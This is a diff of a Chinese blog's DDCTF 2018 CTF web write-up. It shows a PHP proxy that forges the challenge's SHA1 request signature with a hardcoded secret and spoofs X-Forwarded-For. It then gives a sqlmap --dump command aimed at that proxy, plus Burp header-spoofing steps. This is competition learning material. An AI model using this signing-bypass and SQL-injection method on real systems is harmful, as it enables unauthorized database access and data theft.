@@ -133,7 +133,7 @@
 <meta property="og:image" content="http://blog.darknessdoor.com/upload_image/20180524/ctf-web-10.png">
 <meta property="og:image" content="http://blog.darknessdoor.com/upload_image/20180524/ctf-web-11.png">
 <meta property="og:image" content="http://blog.darknessdoor.com/upload_image/20180524/ctf-web-12.png">
-<meta property="og:updated_time" content="2018-05-24T13:57:17.780Z">
+<meta property="og:updated_time" content="2018-05-24T14:00:10.075Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DDCTF-2018-writeup">
 <meta name="twitter:description" content="万丈红尘静驻于茫茫人海看世事繁华嘈杂喧嚣心却孤零   　　 　　 前辈推荐了DDCTF的2018writeup，觉得有必要跟进了解一下。如果有兴趣的也可以去了解一下。">
@@ -478,50 +478,16 @@ function submitt() {
 
 <p>有兴趣有毅力的童鞋大佬可以坚持整理下。然后在我底下留言告诉我您是怎么整理出来的。<br>然后你会发现上面的这段js代码中，位特定的字符串凭借后的SHA1，构造的方式是<code>id=title=author=date=time=adrefkfweodfsdpiru</code><br>然后我们在返回主页面，其实刚才我太粗心了点。在查看源代码的时候没发现这个input标签的type是hidden属性。以后一定要仔细。下图，打红色箭头的。<br><img src="/upload_image/20180524/ctf-web-11.png" alt=""></p>
 <p>然后肯定就是要针对author=1进行一些姿势，到了这里呢，我开始就有点不太会了。讲真的，完全不造第一题出这么难是要干吗。第一题这么难，后面的题目大家都凉凉了呀。<br>然后看了两位大佬的方法，都其实挺不错的…但都要自己构造脚本或者仿写本地文件。（讲真，我流下了，没有技术的泪水。）</p>
-<h5 id="a-采用了使用-PHP-编写代理页面的方式"><a href="#a-采用了使用-PHP-编写代理页面的方式" class="headerlink" title="a.采用了使用 PHP 编写代理页面的方式"></a>a.采用了使用 PHP 编写代理页面的方式</h5><p>这位大佬采用了了采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。（即可…说的好像很容易似的。）<br>命名一个proxy.php  对其中写入如下的代码。</p>
-<pre><code>
-                <?php
-                @$id = $_REQUEST['id'];
-                @$title = $_REQUEST['title'];
-                @$author = $_REQUEST['author'];
-                @$date = $_REQUEST['date'];
-                $time = time();
-                $sig = sha1('id='.$id.'title='.$title.'author='.$author.'date='.$date.'time='.$time.'adrefkfweodfsdpiru');
-                $ch = curl_init();
-                $post = [
-                    'id' => $id,
-                    'title' => $title,
-                    'author' => $author,
-                    'date' => $date,
-                ];
-                curl_setopt($ch, CURLOPT_URL,"http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&time=$time");
-                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-                    'X-Forwarded-For: 123.232.23.245',
-                    ));
-                curl_setopt($ch, CURLOPT_POST, 1);
-                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                curl_setopt($ch, CURLOPT_HEADER, true);
-                $ch_out = curl_exec($ch);
-                $ch_info = curl_getinfo($ch);
-                $header = substr($ch_out, 0, $ch_info['header_size']);
-                $body = substr($ch_out, $ch_info['header_size']);
-                http_response_code($ch_info['http_code']);
-                //header($header);
-                //echo $header;
-                echo $body;
-                </code></pre>
-之后通过对本地的这个php页面进行一个slqmap注入。说实话我很好奇，他是怎么知道的这个注入点的。后来释然了。这道题的提示是数据库的秘密，你肯定得进去数据库，只能注入了..
-
-
-sqlmap注入命令如下
+<h5 id="a-采用了使用-PHP-编写代理页面的方式"><a href="#a-采用了使用-PHP-编写代理页面的方式" class="headerlink" title="a.采用了使用 PHP 编写代理页面的方式"></a>a.采用了使用 PHP 编写代理页面的方式</h5><p>这位大佬采用了了采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。（即可…说的好像很容易似的。）<br>命名一个proxy.php  对其中写入如下的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">@$id = $_REQUEST[&apos;id&apos;];</div><div class="line">@$title = $_REQUEST[&apos;title&apos;];</div><div class="line">@$author = $_REQUEST[&apos;author&apos;];</div><div class="line">@$date = $_REQUEST[&apos;date&apos;];</div><div class="line">$time = time();</div><div class="line">$sig = sha1(&apos;id=&apos;.$id.&apos;title=&apos;.$title.&apos;author=&apos;.$author.&apos;date=&apos;.$date.&apos;time=&apos;.$time.&apos;adrefkfweodfsdpiru&apos;);</div><div class="line">$ch = curl_init();</div><div class="line">$post = [</div><div class="line">	&apos;id&apos; =&gt; $id,</div><div class="line">	&apos;title&apos; =&gt; $title,</div><div class="line">	&apos;author&apos; =&gt; $author,</div><div class="line">	&apos;date&apos; =&gt; $date,</div><div class="line">];</div><div class="line">curl_setopt($ch, CURLOPT_URL,&quot;http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time&quot;);</div><div class="line">curl_setopt($ch, CURLOPT_HTTPHEADER, array(</div><div class="line">	&apos;X-Forwarded-For: 123.232.23.245&apos;,</div><div class="line">	));</div><div class="line">curl_setopt($ch, CURLOPT_POST, 1);</div><div class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $post);</div><div class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</div><div class="line">curl_setopt($ch, CURLOPT_HEADER, true);</div><div class="line">$ch_out = curl_exec($ch);</div><div class="line">$ch_info = curl_getinfo($ch);</div><div class="line">$header = substr($ch_out, 0, $ch_info[&apos;header_size&apos;]);</div><div class="line">$body = substr($ch_out, $ch_info[&apos;header_size&apos;]);</div><div class="line">http_response_code($ch_info[&apos;http_code&apos;]);</div><div class="line">//header($header);</div><div class="line">//echo $header;</div><div class="line">echo $body;</div></pre></td></tr></table></figure></p>
+<p>之后通过对本地的这个php页面进行一个slqmap注入。说实话我很好奇，他是怎么知道的这个注入点的。后来释然了。这道题的提示是数据库的秘密，你肯定得进去数据库，只能注入了..</p>
+<p>sqlmap注入命令如下</p>
 <pre><code>
 sqlmap.py -u 'http://127.0.0.1/proxy.php?author=admin' --dump 
 </code></pre>
 
 <p>从大佬这盗了一张图。<br><img src="/upload_image/20180524/ctf-web-12.png" alt=""><br>能够明显的看到这个flag已经获取到了。</p>
 <p>接下来讲看到的第二个方法。感觉这个方法，我还是能够学会的。估计也够呛了。</p>
-<h5 id="b-burp构造脚本发送"><a href="#b-burp构造脚本发送" class="headerlink" title="b.burp构造脚本发送"></a>b.burp构造脚本发送</h5><p>更新中</p>
+<h5 id="b-burp构造脚本发送"><a href="#b-burp构造脚本发送" class="headerlink" title="b.burp构造脚本发送"></a>b.burp构造脚本发送</h5><p>通过burp直接构造响应头（这个是个新姿势，看来burp还有很多功能还没有玩透啊）<br>使用 burp 来修改数据。<br>proxy-&gt;options-&gt;match and replace<br>将 useragent 替换成 X-Forwarded-For: 123.232.23.245<br>将hidden 替换成text ，将intercept 勾上 off<br>更新中</p>
 
       
     </div>
@@ -539,7 +505,7 @@ sqlmap.py -u 'http://127.0.0.1/proxy.php?author=admin' --dump
   <p><span>本文标题:</span><a href="/2018/05/24/DDCTF-2018 -writeup/">DDCTF-2018-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 暗门 的个人博客">暗门</a></p>
   <p><span>发布时间:</span>2018年05月24日 - 11:05</p>
-  <p><span>最后更新:</span>2018年05月24日 - 21:05</p>
+  <p><span>最后更新:</span>2018年05月24日 - 22:05</p>
   <p><span>原始链接:</span><a href="/2018/05/24/DDCTF-2018 -writeup/" title="DDCTF-2018-writeup">http://blog.darknessdoor.com/2018/05/24/DDCTF-2018 -writeup/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://blog.darknessdoor.com/2018/05/24/DDCTF-2018 -writeup/"  aria-label="复制成功！"></i></span>
   </p>
